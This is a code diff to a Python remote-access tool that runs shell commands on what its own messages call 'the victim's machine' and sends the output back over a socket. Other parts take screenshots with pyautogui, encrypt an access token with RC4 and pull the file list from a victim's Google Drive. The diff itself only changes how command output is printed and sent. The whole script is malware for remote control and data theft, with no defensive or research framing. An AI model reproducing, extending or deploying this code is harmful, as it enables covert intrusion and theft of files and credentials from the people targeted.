@@ -58,7 +58,6 @@ def get_attacker_info():
 # Function to encrypt access token using RC4
 def encrypt_access_token(token, key_length):
     key = generate_random_key(key_length)
-    # RC4 encryption
     cipher = ARC4.new(key)
     encrypted_token = cipher.encrypt(token.encode())
     return base64.b64encode(encrypted_token).decode()
@@ -115,10 +114,18 @@ def main():
             result = subprocess.run(command, shell=True, capture_output=True, text=True)
             stdout = result.stdout
             stderr = result.stderr
-            
+
             client_socket.send(command.encode())
-            client_socket.send(stdout.encode())
-            client_socket.send(stderr.encode())
+
+            if stdout:
+                print(GREEN + stdout + RESET)
+                print(GREEN + "[+] Command executed successfully!" + RESET)
+                client_socket.send(stdout.encode())
+            else:
+                print(RED + "[!] No output returned from the victim's machine." + RESET)
+
+            if stderr:
+                client_socket.send(stderr.encode())
 
             if command.lower() == "screen":
                 screen = pyautogui.screenshot()
@@ -159,10 +166,6 @@ def main():
                 url = "https://www.googleapis.com/drive/v3/files"
                 response = requests.get(url, headers=headers)
                 client_socket.send(response.text.encode())
-
-            else:
-                client_socket.send(stdout.encode())
-                client_socket.send(stderr.encode())
 
         # Closing sockets and display
         client_socket.close()
